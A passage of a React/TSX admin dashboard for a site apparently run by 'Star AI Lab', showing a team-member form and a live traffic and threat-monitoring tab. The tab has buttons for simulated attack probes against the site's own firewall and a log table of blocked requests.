                          <label className="block text-white/60 mb-1 font-medium">Category</label>
                          <select
                            value={teamForm.category}
                            onChange={e => setTeamForm({ ...teamForm, category: e.target.value })}
                            className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white focus:border-cyan-400 outline-none"
                          >
                            <option value="hackathon">Hackathon Squad</option>
                            <option value="founder">Founder & Lead</option>
                            <option value="contributor">Contributor</option>
                          </select>
                        </div>
                        <div>
                          <label className="block text-white/60 mb-1 font-medium">Badge Label</label>
                          <input
                            type="text"
                            value={teamForm.badge}
                            onChange={e => setTeamForm({ ...teamForm, badge: e.target.value })}
                            placeholder="e.g. CareerKick Co-Creator"
                            className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                        <div>
                          <label className="block text-white/60 mb-1 font-medium">Avatar Image URL</label>
                          <input
                            type="text"
                            value={teamForm.avatarUrl}
                            onChange={e => setTeamForm({ ...teamForm, avatarUrl: e.target.value })}
                            placeholder="https://github.com/RanaSuman.png"
                            className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-white/60 mb-1 font-medium">Bio & Contribution Summary</label>
                        <textarea
                          rows={3}
                          value={teamForm.bio}
                          onChange={e => setTeamForm({ ...teamForm, bio: e.target.value })}
                          placeholder="Detailed overview of their contribution and collaboration with Star AI Lab..."
                          className="w-full bg-slate-800 border border-white/10 rounded-xl p-3 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                        />
                      </div>

                      {/* Social Media Links */}
                      <div className="p-3.5 rounded-xl border border-white/5 bg-slate-950/40 space-y-2.5">
                        <span className="block font-mono text-[11px] text-cyan-400 uppercase font-semibold">Social Media Handles</span>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                          <input
                            type="text"
                            value={teamForm.website}
                            onChange={e => setTeamForm({ ...teamForm, website: e.target.value })}
                            placeholder="Website (https://suman-rana.netlify.app/)"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="text"
                            value={teamForm.github}
                            onChange={e => setTeamForm({ ...teamForm, github: e.target.value })}
                            placeholder="GitHub (https://github.com/RanaSuman)"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="text"
                            value={teamForm.linkedin}
                            onChange={e => setTeamForm({ ...teamForm, linkedin: e.target.value })}
                            placeholder="LinkedIn URL"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="email"
                            value={teamForm.email}
                            onChange={e => setTeamForm({ ...teamForm, email: e.target.value })}
                            placeholder="Email (ranasuman6699@gmail.com)"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="text"
                            value={teamForm.unstop}
                            onChange={e => setTeamForm({ ...teamForm, unstop: e.target.value })}
                            placeholder="Unstop Profile URL (https://unstop.com/u/...)"
                            className="sm:col-span-2 bg-slate-800 border border-cyan-500/30 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                      </div>

                      {/* Hackathon / Competition */}
                      <div className="p-3.5 rounded-xl border border-white/5 bg-slate-950/40 space-y-2.5">
                        <span className="block font-mono text-[11px] text-cyan-400 uppercase font-semibold">Hackathon & Competition Attended</span>
                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                          <input
                            type="text"
                            value={teamForm.competitionName}
                            onChange={e => setTeamForm({ ...teamForm, competitionName: e.target.value })}
                            placeholder="Event: Web3 & Campus Innovation Summit"
                            className="sm:col-span-2 bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="text"
                            value={teamForm.competitionYear}
                            onChange={e => setTeamForm({ ...teamForm, competitionYear: e.target.value })}
                            placeholder="Year: 2024"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                          <input
                            type="text"
                            value={teamForm.competitionTrack}
                            onChange={e => setTeamForm({ ...teamForm, competitionTrack: e.target.value })}
                            placeholder="Track / Prototype Description"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                          <input
                            type="text"
                            value={teamForm.competitionOutcome}
                            onChange={e => setTeamForm({ ...teamForm, competitionOutcome: e.target.value })}
                            placeholder="Outcome / Award"
                            className="bg-slate-800 border border-white/10 rounded-lg px-3 py-1.5 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-white/60 mb-1 font-medium">Skills (Comma-separated)</label>
                        <input
                          type="text"
                          value={teamForm.skills}
                          onChange={e => setTeamForm({ ...teamForm, skills: e.target.value })}
                          placeholder="React, Full-Stack, Web3, UI/UX"
                          className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                        />
                      </div>

                      <div className="flex items-center justify-end gap-2 pt-4 border-t border-white/10">
                        <button
                          type="button"
                          onClick={closeTeamForm}
                          className="px-4 py-2 rounded-xl text-white/60 hover:text-white hover:bg-white/5 transition-colors"
                        >
                          Cancel
                        </button>
                        <button
                          type="submit"
                          disabled={teamSaving}
                          className="flex items-center gap-1.5 px-5 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold transition-all disabled:opacity-50"
                        >
                          {teamSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />}
                          <span>Save Team Member</span>
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ── LIVE RADAR & SECURITY TAB ── */}
          {activeTab === 'traffic' && (() => {
            const totalHits = (trafficData?.serverBreakdown || []).reduce((acc: number, cur: any) => acc + (cur.count || 0), 0) || 1;

            const filteredAlerts = (trafficData?.securityAlerts || []).filter((alert: any) => {
              const q = radarSearch.toLowerCase();
              const matchesSearch = !radarSearch ||
                alert.ip?.toLowerCase().includes(q) ||
                alert.url?.toLowerCase().includes(q) ||
                alert.threatType?.toLowerCase().includes(q) ||
                alert.payload?.toLowerCase().includes(q);

              const matchesType = threatFilter === 'ALL' ||
                (threatFilter === 'SQLI' && alert.threatType?.toUpperCase().includes('SQL')) ||
                (threatFilter === 'XSS' && alert.threatType?.toUpperCase().includes('XSS')) ||
                (threatFilter === 'TRAVERSAL' && alert.threatType?.toUpperCase().includes('TRAVERSAL')) ||
                (threatFilter === 'SCANNER' && alert.threatType?.toUpperCase().includes('SCANNER'));

              return matchesSearch && matchesType;
            });

            const filteredVisits = (trafficData?.recentVisits || []).filter((v: any) => {
              if (!radarSearch) return true;
              const q = radarSearch.toLowerCase();
              return (
                v.ip?.toLowerCase().includes(q) ||
                v.serverSource?.toLowerCase().includes(q) ||
                v.path?.toLowerCase().includes(q) ||
                v.browser?.toLowerCase().includes(q) ||
                v.location?.toLowerCase().includes(q)
              );
            });

            return (
              <div className="space-y-8 animate-in fade-in duration-300">

                {/* Telemetry Header Bar */}
                <div className="bg-gradient-to-r from-slate-900 via-slate-900/90 to-slate-950 p-6 rounded-2xl border border-white/10 flex flex-col xl:flex-row items-start xl:items-center justify-between gap-4">
                  <div>
                    <div className="flex items-center gap-3">
                      <span className="relative flex h-3 w-3">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-3 w-3 bg-cyan-500"></span>
                      </span>
                      <h2 className="text-lg font-bold text-white flex items-center gap-2">
                        Live Traffic & Cyber Threat Radar
                        <span className="px-2.5 py-0.5 text-[10px] uppercase tracking-wider font-semibold bg-cyan-500/15 text-cyan-400 border border-cyan-500/30 rounded-full">
                          100% Dynamic Real-Time
                        </span>
                      </h2>
                    </div>
                    <p className="text-white/40 text-xs mt-1">
                      Continuous real-time telemetry inspecting all visitor IPs, origin servers, and automatic security firewall with instant email alerts.
                    </p>
                    <div className="flex items-center gap-2 mt-2 text-[11px] text-slate-400 font-mono">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                      <span>Last telemetry sync: <strong className="text-cyan-300">{lastSyncTime}</strong></span>
                      <span className="text-slate-600">•</span>
                      <span>Listening on port 5000</span>
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center gap-2.5">
                    {/* Polling Interval Switcher */}
                    <div className="flex items-center rounded-xl bg-white/[0.04] border border-white/10 p-1 text-xs">
                      <button
                        onClick={() => setPollingInterval(3500)}
                        className={`px-3 py-1.5 rounded-lg font-medium transition-all ${pollingInterval === 3500
                            ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow-sm'
                            : 'text-white/40 hover:text-white'
                          }`}
                        title="Poll every 3.5 seconds"
                      >
                        ⚡ 3.5s Live
                      </button>
                      <button
                        onClick={() => setPollingInterval(8000)}
                        className={`px-3 py-1.5 rounded-lg font-medium transition-all ${pollingInterval === 8000
                            ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 shadow-sm'
                            : 'text-white/40 hover:text-white'
                          }`}
                        title="Poll every 8 seconds"
                      >
                        ⏱️ 8s
                      </button>
                      <button
                        onClick={() => setPollingInterval(0)}
                        className={`px-3 py-1.5 rounded-lg font-medium transition-all ${pollingInterval === 0
                            ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30 shadow-sm'
                            : 'text-white/40 hover:text-white'
                          }`}
                        title="Pause live polling"
                      >
                        ⏸️ Pause
                      </button>
                    </div>

                    <button
                      onClick={fetchLiveTraffic}
                      disabled={trafficLoading}
                      className="flex items-center gap-2 px-3.5 py-2 bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white rounded-xl text-xs font-medium transition-all"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${trafficLoading ? 'animate-spin text-cyan-400' : ''}`} />
                      Refresh
                    </button>

                    {(trafficData?.securityAlerts?.length || 0) > 0 && (
                      <button
                        onClick={handleClearAlerts}
                        className="flex items-center gap-1.5 px-3 py-2 bg-white/5 hover:bg-red-500/10 border border-white/10 hover:border-red-500/20 text-white/40 hover:text-red-400 rounded-xl text-xs transition-all"
                        title="Clear security threat incident logs"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                        Clear Logs
                      </button>
                    )}

                    <button
                      onClick={handleResetTraffic}
                      className="flex items-center gap-1.5 px-3 py-2 bg-white/5 hover:bg-amber-500/10 border border-white/10 hover:border-amber-500/20 text-white/40 hover:text-amber-400 rounded-xl text-xs transition-all"
                      title="Reset visitor traffic metrics"
                    >
                      <Activity className="w-3.5 h-3.5" />
                      Reset Traffic
                    </button>
                  </div>
                </div>

                {/* Simulation & Defense Testing Playground */}
                <div className="bg-gradient-to-r from-blue-950/40 via-purple-950/20 to-slate-900 p-5 rounded-2xl border border-cyan-500/20 shadow-xl shadow-cyan-950/20">
                  <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 mb-4 pb-3 border-b border-white/[0.08]">
                    <div className="flex items-center gap-2.5">
                      <div className="p-2 bg-cyan-500/15 rounded-xl border border-cyan-500/30">
                        <Zap className="w-4 h-4 text-cyan-400" />
                      </div>
                      <div>
                        <h3 className="text-white text-sm font-semibold flex items-center gap-2">
                          Interactive Live Defense & Traffic Testing Playground
                          <span className="px-2 py-0.5 rounded text-[10px] bg-cyan-500/10 text-cyan-300 font-mono">1-Click Probes</span>
                        </h3>
                        <p className="text-white/40 text-xs">
                          Click any test action below to verify live detection, 403 blocking, table updates, and email dispatch to <span className="text-cyan-400 font-mono">starailab.info@gmail.com</span>:
                        </p>
                      </div>
                    </div>

                    <button
                      onClick={handleTestSecurityAlert}
                      disabled={testingAlert}
                      className="flex items-center gap-2 px-4 py-2 bg-red-500/15 hover:bg-red-500/25 border border-red-500/30 text-red-300 rounded-xl text-xs font-semibold transition-all shadow-[0_0_15px_rgba(239,68,68,0.15)] disabled:opacity-50 shrink-0"
                    >
                      {testingAlert ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
                      Send Direct Test Email Alert
                    </button>
                  </div>

                  {/* Testing Action Buttons */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Attack Probes */}
                    <div className="space-y-2">
                      <span className="text-[11px] uppercase tracking-wider text-red-400 font-semibold flex items-center gap-1.5">
                        <Flame className="w-3.5 h-3.5" /> Trigger Security Attack Probes (403 Auto-Blocked)
                      </span>
                      <div className="grid grid-cols-2 gap-2">
                        <button
                          onClick={() => handleSimulateAttack('sqli', 'SQL Injection')}
                          disabled={simulating}
                          className="px-3 py-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/25 hover:border-red-500/40 text-red-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <ShieldAlert className="w-3.5 h-3.5 text-red-400 shrink-0" />
                          <span className="truncate">Test SQLi Injection</span>
                        </button>
                        <button
                          onClick={() => handleSimulateAttack('xss', 'Cross-Site Scripting (XSS)')}
                          disabled={simulating}
                          className="px-3 py-2 bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/25 hover:border-purple-500/40 text-purple-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <ShieldAlert className="w-3.5 h-3.5 text-purple-400 shrink-0" />
                          <span className="truncate">Test XSS Script</span>
                        </button>
                        <button
                          onClick={() => handleSimulateAttack('traversal', 'Path Traversal (.env)')}
                          disabled={simulating}
                          className="px-3 py-2 bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/25 hover:border-amber-500/40 text-amber-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <ShieldAlert className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                          <span className="truncate">Test Path Traversal</span>
                        </button>
                        <button
                          onClick={() => handleSimulateAttack('scanner', 'Automated Scanner Tool')}
                          disabled={simulating}
                          className="px-3 py-2 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/25 hover:border-rose-500/40 text-rose-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <ShieldAlert className="w-3.5 h-3.5 text-rose-400 shrink-0" />
                          <span className="truncate">Test Scanner Probe</span>
                        </button>
                      </div>
                    </div>

                    {/* Inbound Visitor Referrals */}
                    <div className="space-y-2">
                      <span className="text-[11px] uppercase tracking-wider text-cyan-400 font-semibold flex items-center gap-1.5">
                        <Globe className="w-3.5 h-3.5" /> Simulate Inbound Visitor Referrals
                      </span>
                      <div className="grid grid-cols-2 gap-2">
                        <button
                          onClick={() => handleSimulateVisitor('Google Search Server', '🇺🇸 United States', 'Google Chrome', 'Windows', 'Desktop')}
                          disabled={simulating}
                          className="px-3 py-2 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/25 hover:border-cyan-500/40 text-cyan-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <Globe className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                          <span className="truncate">+ Google Search (USA)</span>
                        </button>
                        <button
                          onClick={() => handleSimulateVisitor('GitHub Repository', '🇬🇧 United Kingdom', 'Mozilla Firefox', 'macOS', 'Desktop')}
                          disabled={simulating}
                          className="px-3 py-2 bg-blue-500/10 hover:bg-blue-500/20 border border-blue-500/25 hover:border-blue-500/40 text-blue-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <GithubIcon className="w-3.5 h-3.5 text-blue-400 shrink-0" />
                          <span className="truncate">+ GitHub Link (UK)</span>
                        </button>
                        <button
                          onClick={() => handleSimulateVisitor('LinkedIn Server', '🇩🇪 Germany', 'Microsoft Edge', 'Windows', 'Desktop')}
                          disabled={simulating}
                          className="px-3 py-2 bg-indigo-500/10 hover:bg-indigo-500/20 border border-indigo-500/25 hover:border-indigo-500/40 text-indigo-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <Server className="w-3.5 h-3.5 text-indigo-400 shrink-0" />
                          <span className="truncate">+ LinkedIn (Germany)</span>
                        </button>
                        <button
                          onClick={() => handleSimulateVisitor('Direct / Mobile Safari', '🇮🇳 India', 'Apple Safari', 'iOS', 'Mobile')}
                          disabled={simulating}
                          className="px-3 py-2 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/25 hover:border-emerald-500/40 text-emerald-300 rounded-xl text-xs font-medium transition-all text-left flex items-center gap-2"
                        >
                          <Smartphone className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                          <span className="truncate">+ Mobile Safari (India)</span>
                        </button>
                      </div>
                    </div>
                  </div>

                  {/* Toast notification for simulation */}
                  {(simulationToast || testAlertMessage) && (
                    <div className="mt-4 p-3 rounded-xl bg-slate-900/90 border border-cyan-400/30 text-white text-xs flex items-center gap-2 animate-in fade-in">
                      <Sparkles className="w-4 h-4 text-cyan-400 shrink-0" />
                      <span>{simulationToast || testAlertMessage}</span>
                    </div>
                  )}
                </div>

                {/* 4 Metric Cards */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  {/* Active Online */}
                  <div className="bg-gradient-to-br from-cyan-500/15 to-blue-600/5 border border-cyan-500/20 rounded-2xl p-5 shadow-[0_4px_20px_rgba(6,182,212,0.1)]">
                    <div className="flex items-center justify-between text-white/50 mb-3">
                      <span className="text-xs uppercase font-semibold tracking-wider">Active Explorers</span>
                      <Users className="w-5 h-5 text-cyan-400" />
                    </div>
                    <div className="text-3xl font-black text-white flex items-baseline gap-2">
                      {trafficData?.activeVisitors || 1}
                      <span className="text-xs font-medium text-emerald-400 flex items-center gap-1">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> live now
                      </span>
                    </div>
                    <p className="text-white/30 text-[11px] mt-1">Visitors in the last 15 minutes</p>
                  </div>

                  {/* Total Visits */}
                  <div className="bg-gradient-to-br from-purple-500/15 to-indigo-600/5 border border-purple-500/20 rounded-2xl p-5 shadow-[0_4px_20px_rgba(168,85,247,0.1)]">
                    <div className="flex items-center justify-between text-white/50 mb-3">
                      <span className="text-xs uppercase font-semibold tracking-wider">Total Traffic</span>
                      <Activity className="w-5 h-5 text-purple-400" />
                    </div>
                    <div className="text-3xl font-black text-white">
                      {trafficData?.totalVisits || 1}
                    </div>
                    <p className="text-white/30 text-[11px] mt-1">
                      Across <span className="text-purple-300 font-semibold">{trafficData?.uniqueVisitors || 1}</span> unique IP address{trafficData?.uniqueVisitors !== 1 ? 'es' : ''}
                    </p>
                  </div>

                  {/* Origin Sources */}
                  <div className="bg-gradient-to-br from-blue-500/15 to-sky-600/5 border border-blue-500/20 rounded-2xl p-5 shadow-[0_4px_20px_rgba(59,130,246,0.1)]">
                    <div className="flex items-center justify-between text-white/50 mb-3">
                      <span className="text-xs uppercase font-semibold tracking-wider">Origin Sources</span>
                      <Server className="w-5 h-5 text-blue-400" />
                    </div>
                    <div className="text-3xl font-black text-white">
                      {trafficData?.serverBreakdown?.length || 1}
                    </div>
                    <p className="text-white/30 text-[11px] mt-1">Direct, search engines & external links</p>
                  </div>

                  {/* Cyber Threats Blocked */}
                  <div className={`bg-gradient-to-br ${(trafficData?.totalThreats || 0) > 0
                    ? 'from-red-500/20 to-orange-600/10 border-red-500/30'
                    : 'from-emerald-500/15 to-teal-600/5 border-emerald-500/20'
                    } border rounded-2xl p-5 shadow-[0_4px_20px_rgba(239,68,68,0.1)]`}>
                    <div className="flex items-center justify-between text-white/50 mb-3">
                      <span className="text-xs uppercase font-semibold tracking-wider">Blocked Threats</span>
                      <ShieldAlert className={`w-5 h-5 ${(trafficData?.totalThreats || 0) > 0 ? 'text-red-400 animate-pulse' : 'text-emerald-400'}`} />
                    </div>
                    <div className={`text-3xl font-black ${(trafficData?.totalThreats || 0) > 0 ? 'text-red-400' : 'text-emerald-300'}`}>
                      {trafficData?.totalThreats || 0}
                    </div>
                    <p className="text-white/30 text-[11px] mt-1">
                      {(trafficData?.totalThreats || 0) > 0 ? 'Alerts dispatched to Gmail' : 'Zero breaches • Shield active'}
                    </p>
                  </div>
                </div>

                {/* Origin Servers & Inbound Traffic Distribution */}
                <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                  <div className="flex items-center justify-between mb-4">
                    <h3 className="text-white font-semibold text-sm flex items-center gap-2">
                      <Globe className="w-4 h-4 text-cyan-400" />
                      Origin Servers & Inbound Traffic Distribution
                    </h3>
                    <span className="text-white/40 text-xs">Total Hits: {totalHits}</span>
                  </div>

                  <div className="space-y-3">
                    {trafficData?.serverBreakdown && trafficData.serverBreakdown.length > 0 ? (
                      trafficData.serverBreakdown.map((s: any, idx: number) => {
                        const pct = Math.round((s.count / totalHits) * 100);
                        return (
                          <div key={idx} className="space-y-1.5 bg-white/[0.02] p-3 rounded-xl border border-white/5">
                            <div className="flex items-center justify-between text-xs">
                              <div className="flex items-center gap-2">
                                <Server className="w-3.5 h-3.5 text-cyan-400" />
                                <span className="text-white font-medium">{s.server}</span>
                              </div>
                              <div className="flex items-center gap-2 font-mono">
                                <span className="text-cyan-300 font-semibold">{s.count} hits</span>
                                <span className="text-white/40">({pct}%)</span>
                              </div>
                            </div>
                            <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                              <div
                                className="h-full bg-gradient-to-r from-blue-500 via-cyan-400 to-emerald-400 rounded-full transition-all duration-500"
                                style={{ width: `${Math.max(5, pct)}%` }}
                              />
                            </div>
                          </div>
                        );
                      })
                    ) : (
                      <span className="text-white/30 text-xs">Direct / Localhost navigation</span>
                    )}
                  </div>
                </div>

                {/* Platforms & Browsers Analytics Grid */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* Devices */}
                  <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                    <h3 className="text-white font-semibold text-sm mb-4 flex items-center gap-2">
                      <Laptop className="w-4 h-4 text-cyan-400" />
                      Audience Devices
                    </h3>
                    <div className="space-y-2.5">
                      {(trafficData?.deviceBreakdown || [
                        { type: 'Desktop', count: 1 },
                        { type: 'Mobile', count: 0 },
                        { type: 'Tablet', count: 0 }
                      ]).map((dev: any, i: number) => (
                        <div key={i} className="flex items-center justify-between p-3 rounded-xl bg-white/[0.02] border border-white/5 text-xs">
                          <div className="flex items-center gap-2.5">
                            {dev.type === 'Desktop' ? <Laptop className="w-4 h-4 text-blue-400" /> :
                              dev.type === 'Mobile' ? <Smartphone className="w-4 h-4 text-emerald-400" /> :
                                <Tablet className="w-4 h-4 text-purple-400" />}
                            <span className="text-white/80 font-medium">{dev.type}</span>
                          </div>
                          <span className="font-mono text-cyan-300 font-semibold">{dev.count} visits</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Browsers */}
                  <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                    <h3 className="text-white font-semibold text-sm mb-4 flex items-center gap-2">
                      <Globe className="w-4 h-4 text-purple-400" />
                      Top Browsers
                    </h3>
                    <div className="space-y-2.5">
                      {(trafficData?.browserBreakdown || [
                        { name: 'Google Chrome', count: 1 }
                      ]).map((b: any, i: number) => (
                        <div key={i} className="flex items-center justify-between p-3 rounded-xl bg-white/[0.02] border border-white/5 text-xs">
                          <span className="text-white/80 font-medium">{b.name}</span>
                          <span className="font-mono text-purple-300 font-semibold">{b.count} visits</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Search & Filter Toolbar */}
                <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-4 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3">
                  <div className="relative flex-1">
                    <Search className="w-4 h-4 text-white/30 absolute left-3.5 top-1/2 -translate-y-1/2" />
                    <input
                      type="text"
                      value={radarSearch}
                      onChange={(e) => setRadarSearch(e.target.value)}
                      placeholder="Search by IP, URL, origin server, attack payload..."
                      className="w-full bg-white/5 border border-white/10 rounded-xl pl-9 pr-4 py-2 text-xs text-white placeholder-white/30 focus:outline-none focus:border-cyan-500/50"
                    />
                  </div>
                  <div className="flex items-center gap-2">
                    <Filter className="w-3.5 h-3.5 text-white/40" />
                    <span className="text-xs text-white/40">Threat Type:</span>
                    <select
                      value={threatFilter}
                      onChange={(e) => setThreatFilter(e.target.value)}
                      className="bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-cyan-500/50"
                    >
                      <option value="ALL" className="bg-slate-900 text-white">All Attacks</option>
                      <option value="SQLI" className="bg-slate-900 text-white">SQL Injection</option>
                      <option value="XSS" className="bg-slate-900 text-white">XSS Scripting</option>
                      <option value="TRAVERSAL" className="bg-slate-900 text-white">Path Traversal</option>
                      <option value="SCANNER" className="bg-slate-900 text-white">Scanner Tool</option>
                    </select>
                  </div>
                </div>

                {/* Security Threats Radar Table */}
                <div className="bg-white/[0.02] border border-white/10 rounded-2xl overflow-hidden">
                  <div className="px-6 py-4 border-b border-white/10 bg-white/[0.02] flex items-center justify-between">
                    <div className="flex items-center gap-2.5">
                      <ShieldAlert className="w-5 h-5 text-red-400" />
                      <div>
                        <h3 className="text-white font-semibold text-sm">Intercepted Security Intrusions & Attack Log</h3>
                        <p className="text-white/30 text-[11px]">
                          Blocked SQL Injection, XSS, Path Traversal, and Scanners (Dispatched to <span className="text-cyan-400 font-mono">starailab.info@gmail.com</span>)
                        </p>
                      </div>
                    </div>
                    <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold ${filteredAlerts.length > 0
                        ? 'bg-red-500/20 text-red-300 border border-red-500/30'
                        : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                      }`}>
                      {filteredAlerts.length > 0 ? `${filteredAlerts.length} Incidents` : 'System Secure'}
                    </span>
                  </div>

                  {filteredAlerts.length > 0 ? (
                    <div className="overflow-x-auto">
                      <table className="w-full text-left text-xs text-white/70">
                        <thead className="bg-white/[0.03] text-white/40 uppercase tracking-wider text-[10px] border-b border-white/5">
                          <tr>
                            <th className="px-6 py-3 font-semibold">Threat Class</th>
                            <th className="px-6 py-3 font-semibold">Attacker IP</th>
                            <th className="px-6 py-3 font-semibold">Target Route</th>
                            <th className="px-6 py-3 font-semibold">Payload Snippet</th>
                            <th className="px-6 py-3 font-semibold">Time</th>
                            <th className="px-6 py-3 font-semibold">Email Alert</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-white/5">
                          {filteredAlerts.map((alert: any) => (
                            <tr key={alert.id} className="hover:bg-red-500/[0.04] transition-colors">
                              <td className="px-6 py-3.5">
                                <span className={`px-2.5 py-1 rounded-md text-[10px] font-bold uppercase tracking-wider border ${alert.threatType?.toUpperCase().includes('SQL')
                                    ? 'bg-red-500/20 border-red-500/40 text-red-300'
                                    : alert.threatType?.toUpperCase().includes('XSS')
                                      ? 'bg-purple-500/20 border-purple-500/40 text-purple-300'
                                      : alert.threatType?.toUpperCase().includes('TRAVERSAL')
                                        ? 'bg-amber-500/20 border-amber-500/40 text-amber-300'
                                        : 'bg-rose-500/20 border-rose-500/40 text-rose-300'
                                  }`}>
                                  {alert.threatType}
                                </span>
                              </td>
                              <td className="px-6 py-3.5 font-mono text-cyan-300 font-semibold">{alert.ip}</td>
                              <td className="px-6 py-3.5 font-mono text-amber-300">
                                <span className="text-white/40 font-sans mr-1">{alert.method}</span>
                                {alert.url}
                              </td>
                              <td className="px-6 py-3.5 font-mono text-[11px] text-red-200/90 max-w-xs truncate" title={alert.payload}>
                                {alert.payload || 'N/A'}
                              </td>
                              <td className="px-6 py-3.5 text-white/40 text-[11px] whitespace-nowrap font-mono">
                                {new Date(alert.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                              </td>
                              <td className="px-6 py-3.5">
                                <span className="inline-flex items-center gap-1 text-[10px] text-emerald-400 font-medium">
                                  <CheckCircle className="w-3 h-3" /> Dispatched
                                </span>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  ) : (
                    <div className="text-center py-12">
                      <ShieldCheck className="w-10 h-10 text-emerald-400/40 mx-auto mb-2" />
                      <p className="text-white/50 text-sm font-medium">No Security Breaches Matching Filter</p>
                      <p className="text-white/20 text-xs mt-0.5">The Star AI Lab Shield is actively guarding and inspecting all HTTP requests.</p>
                    </div>
                  )}
                </div>

                {/* Live Visitor Flow & Server Referrer Stream */}
                <div className="bg-white/[0.02] border border-white/10 rounded-2xl overflow-hidden">
                  <div className="px-6 py-4 border-b border-white/10 bg-white/[0.02] flex items-center justify-between">
                    <div className="flex items-center gap-2.5">
                      <Eye className="w-5 h-5 text-cyan-400" />
                      <div>
                        <h3 className="text-white font-semibold text-sm">Live Visitor Flow & Server Referrer Stream</h3>
                        <p className="text-white/30 text-[11px]">Real-time unmasked IP addresses, device user-agents, and location origins</p>
                      </div>
                    </div>
                    <span className="text-white/40 text-xs font-mono">
                      Showing {filteredVisits.length} visits
                    </span>
                  </div>

                  {filteredVisits.length > 0 ? (
                    <div className="overflow-x-auto">
                      <table className="w-full text-left text-xs text-white/70">
                        <thead className="bg-white/[0.03] text-white/40 uppercase tracking-wider text-[10px] border-b border-white/5">
                          <tr>
                            <th className="px-6 py-3 font-semibold">Visitor IP</th>
